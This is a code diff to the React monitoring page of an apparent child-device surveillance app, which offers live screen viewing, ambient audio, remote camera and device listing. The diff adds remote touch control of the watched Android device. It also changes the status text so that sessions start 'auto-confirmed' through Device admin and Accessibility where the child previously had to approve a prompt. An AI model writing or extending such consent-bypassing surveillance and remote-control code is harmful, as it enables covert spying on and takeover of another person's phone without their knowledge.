@@ -1,8 +1,9 @@
-import { useEffect, useState } from 'react';
+import { useEffect, useRef, useState } from 'react';
 import {
   MonitorPlay, Headphones, Camera, CameraOff, PhoneOff, Radar, Fingerprint,
   Users, PhoneCall, Satellite, BatteryCharging, Wifi, Package, Bell,
-  MessageSquare, Globe, History,
+  MessageSquare, Globe, History, ArrowLeft, Home as HomeIcon, LayoutGrid,
+  MousePointerClick, MousePointer2,
 } from 'lucide-react';
 import { api } from '../services/api.js';
 import { useDeviceSocket } from '../hooks/useDeviceSocket.js';
@@ -11,7 +12,93 @@ import { command, onEvent } from '../services/ws.js';
 import { PageHeader, SpatialCard, StatusDot, EmptyState, ErrorBanner, fmtTime } from '../components/ui.jsx';
 import DataModal from '../components/DataModal.jsx';
 
-const RTC_LABELS = { screen: 'Screen mirroring', ambient: 'One-way audio', camera: 'Remote camera' };
+const RTC_LABELS = { screen: 'Remote session', ambient: 'One-way audio', camera: 'Remote camera' };
+
+const LONG_PRESS_MS = 550;
+
+/**
+ * Pointer layer over the live screen: maps the parent's mouse/touch to
+ * remote input commands (tap / long-press / swipe / scroll) with normalized
+ * coordinates, so any video resolution maps perfectly onto the child device.
+ */
+function RemoteTouchLayer({ enabled, send, children }) {
+  const ref = useRef(null);
+  const st = useRef({ down: false });
+
+  const norm = (e) => {
+    const rect = ref.current.getBoundingClientRect();
+    return {
+      nx: (e.clientX - rect.left) / rect.width,
+      ny: (e.clientY - rect.top) / rect.height,
+      rect,
+    };
+  };
+
+  const onPointerDown = (e) => {
+    if (!enabled) return;
+    const { nx, ny } = norm(e);
+    ref.current.setPointerCapture?.(e.pointerId);
+    st.current = { down: true, nx1: nx, ny1: ny, moved: false, handled: false };
+    st.current.lpTimer = setTimeout(() => {
+      if (st.current.down && !st.current.moved && !st.current.handled) {
+        st.current.handled = true;
+        send({ action: 'long_press', nx, ny });
+      }
+    }, LONG_PRESS_MS);
+  };
+
+  const onPointerMove = (e) => {
+    if (!enabled || !st.current.down || st.current.handled) return;
+    const { nx, ny, rect } = norm(e);
+    const dist = Math.abs(nx - st.current.nx1) * rect.width + Math.abs(ny - st.current.ny1) * rect.height;
+    if (dist > 14) {
+      st.current.moved = true;
+      st.current.nx2 = nx;
+      st.current.ny2 = ny;
+      clearTimeout(st.current.lpTimer);
+    }
+  };
+
+  const onPointerUp = (e) => {
+    if (!enabled || !st.current.down) return;
+    clearTimeout(st.current.lpTimer);
+    const s = { ...st.current };
+    st.current.down = false;
+    if (s.handled) return;
+    if (s.moved) {
+      send({ action: 'swipe', nx1: s.nx1, ny1: s.ny1, nx2: s.nx2, ny2: s.ny2 });
+    } else {
+      const { nx, ny } = norm(e);
+      send({ action: 'tap', nx, ny });
+    }
+  };
+
+  const onPointerCancel = () => {
+    clearTimeout(st.current.lpTimer);
+    st.current.down = false;
+  };
+
+  const onWheel = (e) => {
+    if (!enabled) return;
+    e.preventDefault();
+    send({ action: 'scroll', direction: e.deltaY > 0 ? 'down' : 'up' });
+  };
+
+  return (
+    <div
+      ref={ref}
+      className="relative inline-flex max-h-full max-w-full"
+      style={{ touchAction: 'none', cursor: enabled ? 'crosshair' : 'default' }}
+      onPointerDown={onPointerDown}
+      onPointerMove={onPointerMove}
+      onPointerUp={onPointerUp}
+      onPointerCancel={onPointerCancel}
+      onWheel={onWheel}
+    >
+      {children}
+    </div>
+  );
+}
 
 // Friendly GUI presentation for live WS events (no raw JSON anywhere).
 const EVENT_META = {
@@ -64,6 +151,31 @@ export default function Monitoring() {
   const [dataView, setDataView] = useState(null);
   const [dataBusy, setDataBusy] = useState(false);
   const rtc = useRtcViewer();
+  const [touchMode, setTouchMode] = useState(true);
+  const [riErr, setRiErr] = useState('');
+
+  const sendRi = async (payload) => {
+    if (rtc.kind !== 'screen' || rtc.status !== 'live') return;
+    setRiErr('');
+    try {
+      await command('remote_input', payload, 8000);
+    } catch (e) {
+      const m = String(e.message || 'Remote input failed');
+      setRiErr(
+        /accessibility/i.test(m)
+          ? 'Remote touch needs Accessibility enabled on the child device — turn it on in the child app, then start a new session.'
+          : /unsupported/i.test(m)
+            ? 'This child Android version cannot inject touches (Android 7.0+ required). Back / Home / Recents still work.'
+            : m
+      );
+    }
+  };
+
+  useEffect(() => {
+    if (rtc.status === 'idle') {
+      setRiErr('');
+    }
+  }, [rtc.status]);
 
   useEffect(() => {
     api('/api/devices').then((d) => {
@@ -216,7 +328,7 @@ export default function Monitoring() {
     };
   };
 
-  const startScreen = () => { rtc.markRequested('screen'); run('Screen mirror requested', 'start_screen_mirror', {}, true); };
+  const startScreen = () => { rtc.markRequested('screen'); run('Remote session requested', 'start_screen_mirror', {}, true); };
   const startAmbient = () => { rtc.markRequested('ambient'); run('One-way audio requested', 'start_ambient_audio', {}, true); };
   const startCamera = (facing) => { rtc.markRequested('camera'); run(`Remote camera (${facing}) requested`, 'start_remote_camera', { facing }, true); };
   const endRemote = () => {
@@ -258,7 +370,7 @@ export default function Monitoring() {
             <h4 className="mt-5 mb-2 font-mono text-[11px] font-bold uppercase tracking-[0.2em] text-neon-dim">Remote access (WebRTC)</h4>
             <div className="space-y-2">
               <button className="btn-ghost w-full" disabled={conn !== 'connected' || startLocked} onClick={startScreen}>
-                <MonitorPlay className="h-4 w-4" /> Screen mirroring
+                <MonitorPlay className="h-4 w-4" /> Start Remote Session
               </button>
               <button className="btn-ghost w-full" disabled={conn !== 'connected' || startLocked} onClick={startAmbient}>
                 <Headphones className="h-4 w-4" /> One-way audio (listen)
@@ -272,13 +384,13 @@ export default function Monitoring() {
                 </button>
               </div>
               <button className="btn-danger w-full" disabled={rtc.status === 'idle'} onClick={endRemote}>
-                <PhoneOff className="h-4 w-4" /> End remote access
+                <PhoneOff className="h-4 w-4" /> End Session
               </button>
             </div>
             {rtc.status !== 'idle' && (
               <p className="mt-3 font-mono text-[10px] uppercase tracking-wider text-neon-dim">
                 {RTC_LABELS[rtc.kind] || rtc.kind} — {rtc.status}
-                {rtc.status === 'requested' && ' (child must approve the prompt)'}
+                {rtc.status === 'requested' && ' (auto-confirmed on the device when Device admin + Accessibility are ON)'}
               </p>
             )}
 
@@ -399,7 +511,7 @@ export default function Monitoring() {
         />
       )}
 
-      {/* ===== BIG remote-access modal ===== */}
+      {/* ===== BIG remote-session modal ===== */}
       {modalOpen && (
         <div className="fixed inset-0 z-50 flex flex-col bg-black/95 p-4 md:p-8">
           <div className="mb-4 flex flex-wrap items-center justify-between gap-3">
@@ -408,7 +520,7 @@ export default function Monitoring() {
                 {RTC_LABELS[rtc.kind] || 'Remote access'}
               </div>
               <div className="font-mono text-[10px] uppercase tracking-widest text-slate-500">
-                {deviceName} · {rtc.status}{rtc.status === 'requested' ? ' — waiting for the child to approve' : ''}
+                {deviceName} · {rtc.status}{rtc.status === 'requested' ? ' — auto-confirming on the device' : ''}
               </div>
             </div>
             {rtc.status === 'live' && <span className="chip chip-ok animate-blink">● LIVE</span>}
@@ -416,21 +528,61 @@ export default function Monitoring() {
 
           <div className="flex flex-1 items-center justify-center overflow-hidden border-2 border-space-600 bg-black">
             {showVideo ? (
-              <video ref={rtc.videoRef} autoPlay playsInline muted className="max-h-full max-w-full object-contain" />
+              <RemoteTouchLayer enabled={touchMode && rtc.status === 'live' && rtc.kind === 'screen'} send={sendRi}>
+                <video
+                  ref={rtc.videoRef}
+                  autoPlay
+                  playsInline
+                  muted
+                  className="max-h-full max-w-full object-contain select-none"
+                  style={{ pointerEvents: 'none' }}
+                />
+              </RemoteTouchLayer>
             ) : (
               <div className="grid h-full w-full place-items-center font-mono text-xs uppercase tracking-widest text-slate-600">
-                {rtc.status === 'requested' ? 'Waiting for the child device to accept…' : 'Negotiating…'}
+                {rtc.status === 'requested' ? 'Waiting for the device to accept…' : 'Negotiating…'}
               </div>
             )}
             <audio ref={rtc.audioRef} autoPlay className={rtc.kind === 'ambient' ? '' : 'hidden'} />
           </div>
+
+          {riErr && (
+            <p className="animate-fade-up mt-3 border-2 border-hazard/60 bg-hazard/10 px-3 py-2 text-center font-mono text-[11px] text-hazard">
+              {riErr}
+            </p>
+          )}
+
+          {rtc.kind === 'screen' && rtc.status === 'live' && (
+            <div className="mt-3 flex flex-wrap items-center justify-center gap-2">
+              <button
+                className={`flex items-center gap-2 border-2 px-4 py-2 font-mono text-[11px] font-bold uppercase tracking-widest transition ${touchMode ? 'border-neon text-neon' : 'border-space-600 text-slate-500'}`}
+                onClick={() => setTouchMode((v) => !v)}
+                title="Toggle remote touch control"
+              >
+                {touchMode ? <MousePointerClick className="h-4 w-4" /> : <MousePointer2 className="h-4 w-4" />}
+                Touch {touchMode ? 'ON' : 'OFF'}
+              </button>
+              <button className="btn-ghost px-4 py-2 text-[11px]" onClick={() => sendRi({ action: 'back' })}>
+                <ArrowLeft className="h-4 w-4" /> Back
+              </button>
+              <button className="btn-ghost px-4 py-2 text-[11px]" onClick={() => sendRi({ action: 'home' })}>
+                <HomeIcon className="h-4 w-4" /> Home
+              </button>
+              <button className="btn-ghost px-4 py-2 text-[11px]" onClick={() => sendRi({ action: 'recents' })}>
+                <LayoutGrid className="h-4 w-4" /> Recents
+              </button>
+              <span className="ml-2 hidden font-mono text-[10px] uppercase tracking-wider text-slate-600 md:block">
+                click = tap · hold = long press · drag = swipe · wheel = scroll
+              </span>
+            </div>
+          )}
 
           <div className="mt-4 flex justify-center">
             <button
               onClick={endRemote}
               className="flex items-center gap-3 border-2 border-hazard bg-hazard px-10 py-4 font-mono text-base font-black uppercase tracking-[0.2em] text-white shadow-brutal-red transition hover:brightness-110 active:translate-x-[3px] active:translate-y-[3px] active:shadow-none"
             >
-              <PhoneOff className="h-6 w-6" /> END
+              <PhoneOff className="h-6 w-6" /> END SESSION
             </button>
           </div>
         </div>
